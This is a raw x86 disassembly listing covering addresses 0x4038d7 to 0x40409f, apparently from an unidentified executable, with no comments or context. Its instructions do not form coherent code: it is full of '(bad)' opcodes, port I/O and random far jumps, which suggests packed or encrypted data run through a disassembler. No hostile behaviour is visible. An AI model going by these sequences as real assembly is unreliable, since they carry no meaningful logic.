  4038d7:	or     esi,DWORD PTR [eax]
  4038d9:	sub    edi,ebx
  4038db:	in     al,0x88
  4038dd:	pop    eax
  4038de:	xlat   BYTE PTR ds:[ebx]
  4038df:	js     0x403882
  4038e1:	add    dl,BYTE PTR [ebp-0x2e]
  4038e4:	mov    dh,0xf0
  4038e6:	inc    ecx
  4038e7:	ror    BYTE PTR [ebx],0x7a
  4038ea:	xchg   edx,eax
  4038eb:	push   edx
  4038ec:	and    bl,BYTE PTR [esi-0x398d27cb]
  4038f2:	nop
  4038f3:	lods   eax,DWORD PTR ds:[esi]
  4038f4:	imul   esp,DWORD PTR [eax+0x5b],0x25
  4038f8:	fadd   QWORD PTR [ebx]
  4038fa:	push   0xffffffea
  4038fc:	mov    cs,WORD PTR ds:0x4cc561ee
  403902:	or     esp,DWORD PTR [esi-0x4132481e]
  403908:	xchg   BYTE PTR [edx+0x7e],dl
  40390b:	(bad)  
  40390c:	gs clc 
  40390e:	mov    eax,ds:0xcaa8dec8
  403913:	pop    edx
  403914:	adc    bl,BYTE PTR [edi]
  403916:	and    al,0x30
  403918:	pop    ebx
  403919:	mov    BYTE PTR [ebx-0x492eee82],dh
  40391f:	loopne 0x403971
  403921:	xor    esp,ecx
  403923:	cmp    esi,ebp
  403925:	jmp    0xd6ff415e
  40392a:	add    al,al
  40392c:	add    ebx,DWORD PTR [esi+eax*1-0x5b6ccfb8]
  403933:	mov    ch,0x6f
  403935:	mov    ah,0x8f
  403937:	repz sub BYTE PTR [edx-0x5a55f72f],0xc4
  40393f:	lahf   
  403940:	mov    BYTE PTR [edx+0x63511f41],dh
  403946:	ds xchg edi,eax
  403948:	pop    esp
  403949:	jno    0x403924
  40394b:	or     bl,BYTE PTR [edx]
  40394d:	pop    ecx
  40394e:	xchg   esi,eax
  40394f:	add    esp,DWORD PTR [ebx+esi*8-0x3b]
  403953:	or     BYTE PTR [esi-0x4ddc6611],ch
  403959:	out    dx,al
  40395a:	mov    ecx,0xa2b31730
  40395f:	mov    edx,DWORD PTR [ebx+0x552848f2]
  403965:	repz icebp 
  403967:	retf   
  403968:	mov    bl,ah
  40396a:	sbb    esi,ebp
  40396c:	mov    dh,0xc6
  40396e:	xor    eax,0x2e07c222
  403973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403974:	js     0x403939
  403976:	(bad)  
  403977:	popf   
  403978:	push   cs
  403979:	add    eax,0x7a5655d5
  40397e:	add    ebx,DWORD PTR [ecx+0x67e968ba]
  403984:	dec    eax
  403985:	rcl    DWORD PTR [ebp-0x8],cl
  403988:	dec    eax
  403989:	push   0x37
  40398b:	test   al,0x52
  40398d:	iret   
  40398e:	bound  esp,QWORD PTR [esp+eiz*4]
  403991:	fnstsw WORD PTR [esp+edi*1+0x3]
  403995:	jp     0x403a00
  403997:	or     BYTE PTR [ecx+0x6e],0x6c
  40399b:	xchg   DWORD PTR [edx+0x749f104c],edx
  4039a1:	fisttp DWORD PTR [edi-0x26]
  4039a4:	stc    
  4039a5:	mov    esp,0x83b50bff
  4039aa:	jo     0x4039cd
  4039ac:	jne    0x4039ee
  4039ae:	inc    eax
  4039af:	sbb    DWORD PTR [edx-0x27],eax
  4039b2:	test   al,0x67
  4039b4:	mov    dl,0xd9
  4039b6:	push   esp
  4039b7:	pop    esp
  4039b8:	icebp  
  4039b9:	cmc    
  4039ba:	fld    QWORD PTR [eax+0x55]
  4039bd:	lods   al,BYTE PTR ds:[esi]
  4039be:	aaa    
  4039bf:	arpl   WORD PTR [ebp+0x6f],di
  4039c2:	jnp    0x403a40
  4039c4:	mov    ebx,fs
  4039c6:	arpl   bp,bp
  4039c8:	repz int3 
  4039ca:	and    al,0x37
  4039cc:	sub    eax,0xe5fc7dd1
  4039d1:	xchg   esp,eax
  4039d2:	mov    ebp,0xedf8b2d5
  4039d7:	jl     0x4039e4
  4039d9:	pop    eax
  4039da:	arpl   WORD PTR [ecx],si
  4039dc:	shr    DWORD PTR [ebp-0x8],0xde
  4039e0:	les    edi,FWORD PTR [ebp+0x17]
  4039e3:	sbb    dl,BYTE PTR [eax]
  4039e5:	or     esp,DWORD PTR [edx+0x749bcbb7]
  4039eb:	add    al,0xc8
  4039ed:	mov    dh,0x58
  4039ef:	inc    esi
  4039f0:	(bad)  
  4039f1:	retf   
  4039f2:	mov    dh,BYTE PTR [edx+ebx*1+0x3d]
  4039f6:	or     al,BYTE PTR [ecx]
  4039f8:	push   esp
  4039f9:	xchg   edx,eax
  4039fa:	mov    ch,0xaa
  4039fc:	test   BYTE PTR [ecx+ebx*4+0x22],bl
  403a00:	push   es
  403a01:	pop    esp
  403a02:	aad    0x55
  403a04:	push   esp
  403a05:	add    eax,0x44819db3
  403a0a:	(bad)  
  403a0b:	sbb    BYTE PTR [ebx-0x59],ch
  403a0e:	aaa    
  403a0f:	into   
  403a10:	shl    DWORD PTR [eax+0x53],0x84
  403a14:	es mov esi,0x56972ee
  403a1a:	xchg   edx,ecx
  403a1c:	xchg   edx,eax
  403a1d:	and    cl,BYTE PTR [ecx]
  403a1f:	cwde   
  403a20:	cmp    al,0x35
  403a22:	pop    es
  403a23:	fdiv   QWORD PTR [edi]
  403a25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a26:	xchg   edx,eax
  403a27:	loopne 0x4039bc
  403a29:	in     eax,0x3b
  403a2b:	sub    eax,0xc83fbf5
  403a30:	sbb    DWORD PTR [ebx+0x64],esp
  403a33:	and    eax,0x4dc13a88
  403a38:	mov    eax,0x6683bb7d
  403a3d:	sbb    DWORD PTR [ecx+eiz*1],edx
  403a40:	test   DWORD PTR [edi+0x3e95874b],0x7f0ec110
  403a4a:	sbb    al,0x98
  403a4c:	std    
  403a4d:	outs   dx,BYTE PTR ds:[esi]
  403a4e:	jne    0x403a88
  403a50:	sbb    DWORD PTR [ebx-0x19],esi
  403a53:	int    0x86
  403a55:	or     eax,0x6934d26a
  403a5a:	sbb    ecx,DWORD PTR [esi]
  403a5c:	xor    edx,eax
  403a5e:	adc    edx,0x2f8ca5df
  403a64:	inc    DWORD PTR gs:[edx+0x7c70b9fb]
  403a6b:	jae    0x403aae
  403a6d:	adc    al,0xf3
  403a6f:	sub    DWORD PTR [edx-0x5a],esp
  403a72:	xor    DWORD PTR [eax-0x1],esp
  403a75:	push   eax
  403a76:	cld    
  403a77:	and    DWORD PTR [ecx-0x6e],0x50
  403a7b:	inc    eax
  403a7c:	pop    eax
  403a7d:	cmp    ecx,DWORD PTR [esi]
  403a7f:	mov    al,ds:0x949cd368
  403a84:	and    ch,BYTE PTR [ecx]
  403a86:	or     al,0x6
  403a88:	lods   eax,DWORD PTR ds:[esi]
  403a89:	adc    DWORD PTR [ecx+0x41],esp
  403a8c:	div    BYTE PTR [esi+0x41dda690]
  403a92:	dec    esi
  403a93:	push   ss
  403a94:	push   edx
  403a95:	scas   eax,DWORD PTR es:[edi]
  403a96:	xchg   esp,eax
  403a97:	xlat   BYTE PTR ds:[ebx]
  403a98:	dec    eax
  403a99:	adc    BYTE PTR [eax],dl
  403a9b:	test   esp,0x2e33b604
  403aa1:	fcomp  DWORD PTR [ebx+0x13474207]
  403aa7:	sbb    edi,DWORD PTR [ebp-0x2a]
  403aaa:	xor    ecx,edx
  403aac:	pop    esp
  403aad:	xor    al,0x38
  403aaf:	inc    eax
  403ab1:	and    ecx,ebp
  403ab3:	aaa    
  403ab4:	bound  edi,QWORD PTR [edx]
  403ab6:	mov    cl,0xae
  403ab8:	or     DWORD PTR [ebp+0x2c2b4c54],ebx
  403abe:	das    
  403abf:	js     0x403b16
  403ac1:	jg     0x403af0
  403ac3:	mov    bl,dl
  403ac5:	in     al,0x60
  403ac7:	jae    0x403ada
  403ac9:	lea    esi,[edi+0x3e6bf612]
  403acf:	sbb    ecx,DWORD PTR [edi]
  403ad1:	jmp    0x4431:0x7d9ca64a
  403ad8:	push   0x6d
  403ada:	and    BYTE PTR [edx+0x25c87527],ch
  403ae0:	mov    ebx,0x5b019b11
  403ae5:	inc    edx
  403ae6:	dec    ebp
  403ae7:	sbb    DWORD PTR [ebp+0x78a89b0f],esi
  403aed:	or     DWORD PTR [esi-0xe],ebx
  403af0:	aad    0xd2
  403af2:	jle    0x403af5
  403af4:	cmp    ebx,DWORD PTR [esi-0x8]
  403af7:	inc    ebx
  403af8:	or     esp,eax
  403afa:	outs   dx,DWORD PTR ds:[esi]
  403afb:	xchg   esi,eax
  403afc:	fbld   TBYTE PTR [edi+0x77433925]
  403b02:	(bad)  
  403b03:	and    al,0x4d
  403b05:	sbb    BYTE PTR [edx],dh
  403b07:	dec    ecx
  403b08:	adc    DWORD PTR [esi+0x38],0x7e
  403b0c:	add    edx,DWORD PTR [ebx+0x3a286ed0]
  403b12:	and    eax,0x6da50081
  403b17:	out    dx,al
  403b18:	mov    esp,0xd3930d6d
  403b1d:	jge    0x403b7a
  403b1f:	xchg   edx,eax
  403b20:	out    dx,eax
  403b21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b22:	add    DWORD PTR [ebp-0x297cccb0],ebx
  403b28:	pop    eax
  403b29:	and    ch,BYTE PTR [ecx+eax*2+0x713cace7]
  403b30:	mov    BYTE PTR [edi-0x6],bh
  403b33:	dec    ecx
  403b34:	sti    
  403b35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b36:	mov    bl,0xe5
  403b38:	std    
  403b39:	xchg   ebp,eax
  403b3a:	add    al,0x68
  403b3c:	inc    ecx
  403b3d:	out    dx,eax
  403b3e:	std    
  403b3f:	clc    
  403b40:	and    DWORD PTR [esi+ebx*4-0x6e],ebx
  403b44:	hlt    
  403b45:	dec    ebp
  403b46:	xor    dl,bl
  403b48:	loope  0x403b99
  403b4a:	scas   eax,DWORD PTR es:[edi]
  403b4b:	or     bh,BYTE PTR [esi-0x29956939]
  403b51:	sub    DWORD PTR [edx+0x7f],eax
  403b54:	sub    dh,BYTE PTR [ecx+0x3472c6ab]
  403b5a:	bound  esp,QWORD PTR [ebx+edx*8+0x49]
  403b5e:	sbb    eax,0x86431c1b
  403b63:	dec    esp
  403b64:	aad    0x42
  403b66:	not    eax
  403b68:	cmp    eax,0x3908f730
  403b6d:	lahf   
  403b6e:	dec    eax
  403b6f:	in     al,dx
  403b70:	sub    ah,ch
  403b72:	mov    cl,0xd6
  403b74:	xchg   ecx,eax
  403b75:	clc    
  403b76:	jb     0x403bc4
  403b78:	stos   DWORD PTR es:[edi],eax
  403b79:	adc    eax,0xf6e37a6a
  403b7e:	cwde   
  403b7f:	ret    0xeb40
  403b82:	ins    BYTE PTR es:[edi],dx
  403b83:	loop   0x403b0d
  403b85:	or     edi,DWORD PTR [edi]
  403b87:	push   edx
  403b88:	mov    ecx,0x74fe3808
  403b8d:	jmp    0x2dc01dba
  403b92:	jbe    0x403bb5
  403b94:	ret    
  403b95:	dec    edi
  403b96:	sar    BYTE PTR [ecx+0x18],cl
  403b99:	adc    al,0x3f
  403b9b:	or     edi,DWORD PTR cs:[esi+0x22]
  403b9f:	loop   0x403be3
  403ba1:	jg     0x403b4d
  403ba3:	jp     0x403b2e
  403ba5:	mov    BYTE PTR [eax+0x732c463d],ch
  403bab:	lea    edx,[ebp-0x4]
  403bae:	jp     0x403bd7
  403bb0:	lock pop esp
  403bb2:	jnp    0x403c1f
  403bb4:	icebp  
  403bb5:	out    dx,eax
  403bb6:	push   es
  403bb7:	iret   
  403bb8:	arpl   WORD PTR [ebx],sp
  403bba:	sub    eax,0x1f563a2d
  403bbf:	sub    BYTE PTR [ebx+0x44],0x7b
  403bc3:	adc    eax,ecx
  403bc5:	outs   dx,WORD PTR ds:[esi]
  403bc7:	mov    ecx,0xfb24c8b0
  403bcc:	xchg   esi,eax
  403bcd:	leave  
  403bce:	xchg   DWORD PTR [ebx-0x78dd0f96],ecx
  403bd4:	pop    ebx
  403bd5:	push   ebp
  403bd6:	cmc    
  403bd7:	xchg   edx,eax
  403bd8:	into   
  403bd9:	push   esi
  403bda:	outs   dx,BYTE PTR ds:[esi]
  403bdb:	fwait
  403bdc:	mov    BYTE PTR [esi-0x1345cd5a],ah
  403be2:	cmc    
  403be3:	shl    DWORD PTR [edi+0x42],0x2b
  403be7:	mov    ch,al
  403be9:	jg     0x403c0f
  403beb:	bound  eax,QWORD PTR [ebx-0x1a4fea15]
  403bf1:	push   0x2e
  403bf3:	setno  BYTE PTR [esi+0x4c1fb9be]
  403bfa:	xor    DWORD PTR ds:0x11c0adcd,ebx
  403c00:	jne    0x403c38
  403c02:	sub    al,0xea
  403c04:	and    eax,0x58c7462a
  403c09:	push   edx
  403c0a:	push   DWORD PTR [ebx-0x5b74edf2]
  403c10:	loope  0x403c11
  403c12:	xor    ch,BYTE PTR [edi*8-0x559b15ba]
  403c19:	adc    ch,BYTE PTR [eax-0x15]
  403c1c:	popa   
  403c1d:	or     DWORD PTR [ecx+0x5106f001],edi
  403c23:	jno    0x403c52
  403c25:	pop    ss
  403c26:	xor    eax,0x33755d52
  403c2b:	mov    edi,0xcfc5bb60
  403c30:	and    al,ah
  403c32:	test   eax,0xc0c93e3c
  403c37:	lock js 0x403ca8
  403c3a:	jg     0x403bd1
  403c3c:	faddp  st(5),st
  403c3e:	idiv   ch
  403c40:	sbb    al,0x65
  403c42:	add    ch,BYTE PTR [edx]
  403c44:	mov    eax,ds:0x965e050
  403c49:	mov    cl,0xb7
  403c4b:	cli    
  403c4c:	xor    BYTE PTR [edx+0x71bcc33],bl
  403c52:	cmp    al,0xb7
  403c54:	push   0x50
  403c56:	jno    0x403cb7
  403c58:	mov    esi,0xd0df125a
  403c5d:	xor    al,0x54
  403c5f:	mov    ebx,0x314054d2
  403c64:	xchg   edx,eax
  403c65:	test   BYTE PTR [edi+eiz*2-0x63a0d045],0xb9
  403c6d:	and    eax,0xf10562e0
  403c72:	js     0x403cc2
  403c74:	jle    0x403ced
  403c76:	loope  0x403c1d
  403c78:	jge    0x403cba
  403c7a:	dec    ebx
  403c7b:	pusha  
  403c7c:	mov    edi,DWORD PTR [edi]
  403c7e:	push   es
  403c7f:	jbe    0x403c51
  403c81:	cdq    
  403c82:	dec    edi
  403c83:	jnp    0x403c0e
  403c85:	adc    esp,DWORD PTR [edx-0x31]
  403c88:	enter  0x90bb,0x92
  403c8c:	imul   esp,DWORD PTR [esi-0x7ec5ef85],0xfffffffb
  403c93:	push   esi
  403c94:	dec    ecx
  403c95:	dec    ebx
  403c96:	jo     0x403cb4
  403c98:	inc    ebp
  403c99:	mov    ch,0x47
  403c9b:	rcl    dl,cl
  403c9d:	adc    DWORD PTR [esi+0x0],0x26
  403ca1:	(bad)  
  403ca2:	in     eax,dx
  403ca3:	sub    ebx,eax
  403ca5:	mov    al,ds:0x77bd2b55
  403caa:	cmp    eax,0x7f2e5e49
  403caf:	cmp    bh,BYTE PTR [ebp+0x3b]
  403cb2:	arpl   bp,dx
  403cb4:	sbb    ebx,DWORD PTR [ecx-0x19003ab1]
  403cba:	(bad)  
  403cbb:	push   ecx
  403cbc:	xor    eax,0x2375bba3
  403cc1:	jno    0x403c68
  403cc3:	add    esp,DWORD PTR [ebp-0x8fa1b2d]
  403cc9:	arpl   sp,bx
  403ccb:	enter  0x9214,0x88
  403ccf:	and    dl,BYTE PTR [esi+0x5bb6ee53]
  403cd5:	and    DWORD PTR [esi-0x1e],ebx
  403cd8:	frstor [eax+0x3957770]
  403cde:	fisttp WORD PTR [ebx]
  403ce0:	outs   dx,BYTE PTR ds:[esi]
  403ce1:	push   0x24
  403ce3:	test   eax,0x63bcfce4
  403ce8:	dec    edx
  403ce9:	pop    ebp
  403cea:	shl    BYTE PTR [ecx-0x698aa1cd],1
  403cf0:	push   0x5e93a951
  403cf5:	sbb    DWORD PTR [esi+0x43580145],edx
  403cfb:	cld    
  403cfc:	push   esp
  403cfd:	cmc    
  403cfe:	mov    bh,0xf8
  403d00:	repnz cmp eax,0xc5edc40a
  403d06:	mov    ebx,0x462b6264
  403d0b:	sub    DWORD PTR [ebx+0x5476b649],ebp
  403d11:	rcr    DWORD PTR [esi-0x49f178e4],0xeb
  403d18:	and    dl,BYTE PTR [esi]
  403d1a:	repz repnz dec esp
  403d1d:	xchg   ecx,eax
  403d1e:	lods   eax,DWORD PTR ds:[esi]
  403d1f:	js     0x403d4a
  403d21:	fnstcw WORD PTR [edi]
  403d23:	sub    BYTE PTR [edx-0x3c],al
  403d26:	test   DWORD PTR [ecx+0x2e],eax
  403d29:	aaa    
  403d2a:	loope  0x403cbe
  403d2c:	jae    0x403d13
  403d2e:	adc    al,0xd1
  403d30:	adc    al,0x78
  403d32:	dec    ebx
  403d33:	enter  0xe950,0x3c
  403d37:	mov    cl,0x8
  403d39:	in     al,dx
  403d3a:	add    DWORD PTR [eax-0x58],ecx
  403d3d:	adc    DWORD PTR [esi+ecx*1],ebx
  403d40:	adc    DWORD PTR [ecx],esi
  403d42:	aad    0xfc
  403d44:	dec    ecx
  403d45:	xor    dh,BYTE PTR [edx-0x30]
  403d48:	int3   
  403d49:	in     eax,dx
  403d4a:	mov    dh,0xb9
  403d4c:	sbb    BYTE PTR [esi-0x6],ch
  403d4f:	mov    dl,0x23
  403d51:	and    BYTE PTR [eax],bl
  403d53:	inc    esi
  403d54:	std    
  403d55:	call   0xff03:0xc0053f8b
  403d5c:	pop    ss
  403d5d:	mov    ebp,0x5533db7f
  403d62:	popa   
  403d63:	xor    cl,BYTE PTR [eax]
  403d65:	(bad)  
  403d66:	jmp    0x403dc7
  403d68:	imul   BYTE PTR [edx-0x52]
  403d6b:	or     al,0xf9
  403d6d:	xor    ebp,DWORD PTR [bp-0x1a]
  403d71:	inc    esp
  403d72:	or     ch,BYTE PTR [edx]
  403d74:	ret    
  403d75:	push   es
  403d76:	aam    0x54
  403d78:	popa   
  403d79:	fdiv   QWORD PTR [esi-0x1ea65a31]
  403d7f:	push   ebp
  403d80:	popa   
  403d81:	xor    esp,DWORD PTR [ebx-0x7194e25]
  403d87:	dec    edi
  403d88:	push   ebp
  403d89:	add    eax,0x440375ac
  403d8e:	cld    
  403d8f:	sub    bp,WORD PTR [edx+0x72]
  403d93:	push   0x21
  403d95:	(bad)  
  403d97:	sub    eax,0xdf4fc84b
  403d9c:	fild   WORD PTR [edi]
  403d9e:	js     0x403d60
  403da0:	(bad)  
  403da1:	mov    esi,0x5c4961a9
  403da6:	xchg   BYTE PTR [ecx+esi*8],al
  403da9:	mov    bl,0xcf
  403dab:	call   0x1ca5:0xe6258642
  403db2:	xor    al,0xc7
  403db4:	adc    DWORD PTR [esi],esi
  403db6:	inc    edx
  403db7:	mov    ds:0xcf91b730,eax
  403dbc:	cli    
  403dbd:	jmp    FWORD PTR [edx-0x3a]
  403dc0:	call   0x5efeb5e4
  403dc5:	retfw  0x36d1
  403dc9:	cmp    al,0xed
  403dcb:	push   ds
  403dcc:	cmp    dh,BYTE PTR [esi+0x75977115]
  403dd2:	fucomip st,st(4)
  403dd4:	pop    es
  403dd5:	frstor [ecx-0x4f660316]
  403ddc:	xor    BYTE PTR [ecx-0x4bd9b27d],0x18
  403de3:	fwait
  403de4:	pop    esi
  403de6:	inc    edi
  403de7:	and    al,0x1
  403de9:	jnp    0x403d94
  403deb:	inc    esp
  403dec:	es xor al,0x3c
  403def:	call   0xdc603e80
  403df4:	sbb    BYTE PTR [esi],ah
  403df6:	push   0xffffff82
  403df8:	dec    esp
  403df9:	or     al,0x8a
  403dfb:	push   edx
  403dfc:	ss aam 0xf8
  403dff:	imul   ebx,DWORD PTR [edx],0x36934340
  403e05:	push   cs
  403e06:	inc    esi
  403e07:	cmc    
  403e08:	fwait
  403e09:	mov    BYTE PTR [edi-0x1abf1321],ah
  403e0f:	addr16 or al,0xa6
  403e12:	inc    esp
  403e13:	dec    edx
  403e14:	shr    BYTE PTR [edi+0x27],1
  403e17:	mov    ?,WORD PTR [esi]
  403e19:	or     al,0xb7
  403e1b:	xor    DWORD PTR [edi+esi*2-0x1a],0xe7c72349
  403e23:	loopne 0x403ddf
  403e25:	sub    esi,DWORD PTR [ebp+0x47e3dfeb]
  403e2b:	retf   
  403e2c:	out    0x30,al
  403e2e:	and    bh,ch
  403e30:	cmp    ebx,DWORD PTR [edi+0x1815063b]
  403e36:	enter  0x1f2f,0xbd
  403e3a:	les    ebx,FWORD PTR [ebp+0x10]
  403e3d:	stos   DWORD PTR es:[edi],eax
  403e3e:	pop    esi
  403e3f:	loope  0x403ebe
  403e41:	adc    esp,DWORD PTR [esi-0x74]
  403e44:	mov    esp,0x1a7e1875
  403e49:	sub    BYTE PTR [ecx-0x3e],ch
  403e4c:	jae    0x403deb
  403e4e:	xor    esp,ebx
  403e50:	scas   al,BYTE PTR es:[edi]
  403e51:	dec    esi
  403e52:	sub    DWORD PTR [esi+0x25bec33c],0xffffffad
  403e59:	mov    esi,0xdd5f20b0
  403e5e:	rcr    DWORD PTR [ecx+edi*8+0x4f],0x86
  403e63:	es test al,0xd3
  403e66:	stc    
  403e67:	loop   0x403e08
  403e69:	push   cs
  403e6a:	ss xchg edx,eax
  403e6c:	mov    edi,0xf4311624
  403e71:	clc    
  403e72:	push   esp
  403e73:	jne    0x403e03
  403e75:	loope  0x403ec2
  403e77:	fwait
  403e78:	add    DWORD PTR [ebp+0x660679a8],ebx
  403e7e:	xor    BYTE PTR [edx-0x385f65aa],al
  403e84:	ins    BYTE PTR es:[edi],dx
  403e85:	into   
  403e86:	das    
  403e87:	imul   edx,DWORD PTR [ebp+0x46],0xffffffdf
  403e8b:	cmc    
  403e8c:	(bad)  
  403e8d:	push   edx
  403e8e:	inc    eax
  403e8f:	or     al,0xe4
  403e91:	inc    edi
  403e92:	jl     0x403e1d
  403e94:	sahf   
  403e95:	jecxz  0x403ee6
  403e97:	call   0xbcd1:0x6cd8a599
  403e9e:	add    eax,0x1dc8be46
  403ea3:	aam    0xc2
  403ea5:	xchg   BYTE PTR [eax+0x411c4e31],ch
  403eab:	mov    ebx,0xb824eb51
  403eb0:	cmp    eax,0x3ba8bdbc
  403eb5:	repz xor eax,0xe2cd195a
  403ebb:	xchg   ecx,eax
  403ebc:	inc    ecx
  403ebd:	sbb    DWORD PTR [ecx-0x309048a1],edx
  403ec3:	pop    esi
  403ec4:	sti    
  403ec5:	cmp    bh,al
  403ec7:	sbb    al,0xd6
  403ec9:	and    bh,BYTE PTR [eax]
  403ecb:	push   eax
  403ecc:	xor    al,0xb4
  403ece:	dec    ebx
  403ecf:	test   eax,0xc5c5ce8
  403ed4:	test   DWORD PTR [ebx],edx
  403ed6:	dec    eax
  403ed7:	xchg   edi,eax
  403ed8:	push   ebp
  403ed9:	pop    edx
  403eda:	mov    al,0xff
  403edc:	aaa    
  403edd:	clc    
  403ede:	adc    dh,BYTE PTR [ebx-0x31c56de]
  403ee4:	aaa    
  403ee5:	push   ebx
  403ee6:	jge    0x403f46
  403ee8:	retf   
  403ee9:	add    edi,ebp
  403eeb:	and    esi,esp
  403eed:	aas    
  403eee:	in     eax,dx
  403eef:	icebp  
  403ef0:	pop    esi
  403ef1:	mov    bl,0x71
  403ef3:	and    eax,0x3ba7abef
  403ef8:	and    ch,bl
  403efa:	test   al,0x93
  403efc:	sahf   
  403efd:	inc    esp
  403efe:	pop    ecx
  403eff:	inc    ebp
  403f00:	sub    bx,bx
  403f03:	xchg   ebp,eax
  403f04:	scas   eax,DWORD PTR es:[edi]
  403f05:	add    DWORD PTR [edx],edx
  403f07:	pop    eax
  403f08:	push   es
  403f09:	jecxz  0x403eb1
  403f0b:	xchg   esp,eax
  403f0c:	(bad)  
  403f0e:	fiadd  DWORD PTR [eax]
  403f10:	add    ebx,DWORD PTR [edx+0x1f]
  403f13:	xchg   esp,eax
  403f14:	loope  0x403ee7
  403f16:	sbb    esi,DWORD PTR [ecx-0x7f]
  403f19:	pop    edi
  403f1a:	fnstsw WORD PTR [edi-0x241280b7]
  403f20:	fs inc ebp
  403f22:	mov    edi,0x71f21e86
  403f27:	(bad)  
  403f28:	sbb    eax,0x66cb8678
  403f2d:	and    al,0xd9
  403f2f:	nop
  403f30:	cmp    esp,DWORD PTR [ecx+0x40]
  403f33:	ret    
  403f34:	iret   
  403f35:	jbe    0x403f53
  403f37:	jmp    0x403f25
  403f39:	sbb    BYTE PTR [eax-0x23],dh
  403f3c:	lds    edx,FWORD PTR [eax-0x2a]
  403f3f:	xchg   ebp,eax
  403f40:	pop    esi
  403f41:	je     0x403f65
  403f43:	pop    ebp
  403f44:	mov    eax,0xb6d44b32
  403f49:	cmp    BYTE PTR [edi-0x72aa4239],al
  403f4f:	ja     0x403f9b
  403f51:	ins    DWORD PTR es:[edi],dx
  403f52:	std    
  403f53:	cmp    ecx,DWORD PTR [edx]
  403f55:	fwait
  403f56:	int3   
  403f57:	adc    al,0x65
  403f59:	xchg   ecx,eax
  403f5a:	xchg   esp,eax
  403f5b:	xchg   esi,eax
  403f5c:	sub    edi,ebp
  403f5e:	adc    esp,ebx
  403f60:	inc    eax
  403f61:	mov    ah,0x49
  403f63:	stos   BYTE PTR es:[edi],al
  403f64:	add    ah,BYTE PTR [eax+0xd1edfa9]
  403f6a:	mov    ebx,ecx
  403f6c:	(bad)
  403f6f:	lds    ebx,FWORD PTR [eax+0x38bca89e]
  403f75:	iret   
  403f76:	and    BYTE PTR [ecx-0xd],bl
  403f79:	push   eax
  403f7a:	dec    edi
  403f7b:	xor    ch,dh
  403f7d:	sbb    eax,0xf480aa4d
  403f82:	add    DWORD PTR [ebx-0x79],eax
  403f85:	rdpmc  
  403f87:	push   edx
  403f88:	gs xchg ebx,eax
  403f8a:	test   eax,0x1e2ec9f0
  403f8f:	pop    esi
  403f90:	dec    ebp
  403f91:	sub    DWORD PTR [eax+0x51],esp
  403f94:	jns    0x404006
  403f96:	dec    eax
  403f97:	(bad)  
  403f98:	out    0xec,al
  403f9a:	mov    esi,0x90e57717
  403f9f:	xchg   DWORD PTR [edx],ebp
  403fa1:	mov    esp,DWORD PTR [edi+0x73]
  403fa4:	jle    0x403f9f
  403fa6:	and    DWORD PTR [ecx],edx
  403fa8:	push   cs
  403fa9:	jl     0x404029
  403fab:	pop    di
  403fad:	test   al,bh
  403faf:	add    al,0xf
  403fb1:	sbb    al,dl
  403fb3:	pop    eax
  403fb4:	ret    0x6a6d
  403fb7:	fwait
  403fb8:	jnp    0x403f79
  403fba:	adc    al,0xd
  403fbc:	sar    BYTE PTR [esi+ecx*4+0x367258f3],1
  403fc3:	dec    eax
  403fc4:	push   cs
  403fc5:	adc    eax,0xd29ce1cf
  403fca:	fldcw  WORD PTR [ebx+0x404430e2]
  403fd0:	mov    dh,0x90
  403fd2:	pop    es
  403fd3:	sbb    eax,0x9bbeeaf9
  403fd8:	dec    ebx
  403fd9:	fimul  DWORD PTR [ecx+0x59]
  403fdc:	push   ebp
  403fdd:	dec    ebx
  403fde:	xchg   ebp,eax
  403fdf:	adc    eax,0x3d32969a
  403fe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fe5:	pop    ds
  403fe6:	fcom   QWORD PTR [esp+ebx*1-0x72]
  403fea:	cmp    BYTE PTR [ebx],cl
  403fec:	mov    eax,ds:0x79ccce1c
  403ff1:	pop    es
  403ff2:	out    0xee,eax
  403ff4:	adc    al,0x55
  403ff6:	push   es
  403ff7:	ja     0x404012
  403ff9:	(bad)  
  403ffa:	sahf   
  403ffb:	(bad)  
  403ffc:	cmp    eax,0xe8d77c81
  404001:	clc    
  404002:	sti    
  404003:	loope  0x404066
  404005:	dec    eax
  404006:	aas    
  404007:	jp     0x404054
  404009:	cld    
  40400a:	fistp  QWORD PTR [ebx]
  40400c:	dec    ebp
  40400d:	xchg   edx,eax
  40400e:	into   
  40400f:	push   ebx
  404010:	pop    ds
  404011:	mov    ch,0xb7
  404013:	mov    dh,0x5c
  404015:	loopne 0x403fe3
  404017:	lahf   
  404018:	add    al,0xb7
  40401a:	add    cl,al
  40401c:	push   cs
  40401d:	sub    bl,BYTE PTR [ebp+0x32]
  404020:	adc    BYTE PTR [esi+edx*1+0x13],ch
  404024:	adc    ch,BYTE PTR [ebx-0x7eee499e]
  40402a:	sbb    al,0x1a
  40402c:	xor    eax,0xe429aaf5
  404031:	stc    
  404032:	imul   esi,DWORD PTR [esi+ecx*8+0x3d0c0a59],0xd3c27ce9
  40403d:	ror    ch,cl
  40403f:	xor    eax,0x8e2ba621
  404044:	add    DWORD PTR [ebx],eax
  404046:	pop    ss
  404047:	aaa    
  404048:	and    DWORD PTR [esi-0x1599abb2],ecx
  40404e:	push   0xffffffca
  404050:	or     eax,0x1e13df46
  404055:	in     eax,dx
  404056:	inc    ebx
  404057:	mov    DWORD PTR [edx],eax
  404059:	sar    BYTE PTR [ebx],0xe
  40405c:	jge    0x40407d
  40405e:	rcl    BYTE PTR [edx],1
  404060:	loop   0x4040a3
  404062:	sub    DWORD PTR [ecx],0xbd59950
  404068:	xor    al,0x85
  40406a:	jle    0x4040c5
  40406c:	pop    es
  40406d:	xchg   ebx,eax
  40406e:	fnstcw WORD PTR [esi]
  404070:	xchg   esp,eax
  404071:	popf   
  404072:	xchg   esp,eax
  404073:	inc    edi
  404074:	push   esi
  404075:	(bad)  
  404076:	mov    bl,0x64
  404078:	ret    
  404079:	rcl    DWORD PTR [edx-0x75452bef],1
  40407f:	adc    BYTE PTR [ebp-0x2e],0x67
  404083:	inc    esp
  404084:	dec    DWORD PTR [ecx]
  404086:	xchg   DWORD PTR [edx],eax
  404088:	inc    esi
  404089:	test   DWORD PTR [edi],0x945e4a38
  40408f:	(bad)  
  404090:	call   0xcd0b5cb9
  404095:	js     0x40408c
  404097:	(bad)  
  404098:	sbb    eax,0xfc4612bb
  40409d:	sub    al,0x7f
  40409f:	into   
